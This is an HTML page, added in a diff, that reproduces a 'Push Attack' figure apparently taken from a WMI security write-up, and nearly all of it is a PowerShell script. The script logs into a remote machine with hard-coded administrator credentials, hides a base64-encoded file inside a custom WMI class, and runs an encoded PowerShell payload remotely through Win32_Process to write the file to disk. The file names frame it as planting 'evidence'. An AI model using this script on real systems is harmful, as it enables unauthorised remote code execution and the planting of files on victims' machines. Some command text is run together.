@@ -1,0 +1,56 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Push Attack</title>
+</head><body>“Push” Attack WMI Class<br/>
+Figure 9 demonstrates how a WMI class can be created remotely to store file data. That file data can then be dropped to the remote file system using powershell.exe remotely. &nbsp;<br/>
+<br/>
+# Prep file to drop on remote system<br/>
+$LocalFilePath=’C:\Users\ht\Documents\evidence_to_plant.png’<br/>
+$FileBytes=[IO.File]::ReadAllBytes($LocalFilePath)<br/>
+$EncodedFileContentsToDrop=[Convert]::ToBase64String ($FileBytes)<br/>
+<br/>
+# Establish remote WMI connection<br/>
+$Options=New-ObjectManagement.ConnectionOptions<br/>
+$Options.Username =’Administrator’<br/>
+$Options.Password =’user’<br/>
+$Options.EnablePrivileges =$True<br/>
+$Connection=New-ObjectManagement.ManagementScope<br/>
+$Connection.Path =’\\192.168.72.134\root\default’<br/>
+$Connection.Options =$Options<br/>
+$Connection.Connect()<br/>
+<br/>
+# “Push” file contents<br/>
+$EvilClass=New-ObjectManagement.ManagementClass($Connection,<br/>
+[String]::Empty,$null)<br/>
+$EvilClass[‘__CLASS’]=’Win32_EvilClass’<br/>
+$EvilClass.Properties.Add(‘EvilProperty’,[Management.CimType]<br/>
+::String,$False)<br/>
+$EvilClass.Properties[‘EvilProperty’].Value =$EncodedFileContentsToDrop<br/>
+$EvilClass.Put()<br/>
+<br/>
+$Credential=Get-Credential’WIN-B85AAA7ST4U\Administrator’<br/>
+$CommonArgs= @{<br/>
+&nbsp;Credential =$Credential<br/>
+&nbsp;ComputerName =’192.168.72.134’<br/>
+}<br/>
+<br/>
+# The PowerShell payload that will drop the stored file contents<br/>
+$PayloadText=@’<br/>
+$EncodedFile = ([WmiClass] ‘root\default:Win32_EvilClass’).<br/>
+Properties[‘EvilProperty’].Value<br/>
+[IO.File]::WriteAllBytes(‘C:\fighter_jet_specs.png’,<br/>
+[Convert]::FromBase64String($EncodedFile))<br/>
+‘@<br/>
+<br/>
+$EncodedPayload=[Convert]::ToBase64String([Text.Encoding] ::Unicode.<br/>
+GetBytes($PayloadText))<br/>
+$PowerShellPayload=”powershell -NoProfile -EncodedCommand<br/>
+$EncodedPayload”<br/>
+<br/>
+# Drop the file to the target filesystem<br/>
+Invoke-WmiMethod@CommonArgs-ClassWin32_Process-NameCreateArgumentList$PowerShellPayload<br/>
+<br/>
+# Confirm successful file drop<br/>
+Get-WmiObject@CommonArgs-ClassCIM_DataFile-Filter’Name = “C:\\fighter_jet_specs.png”’</body></html>
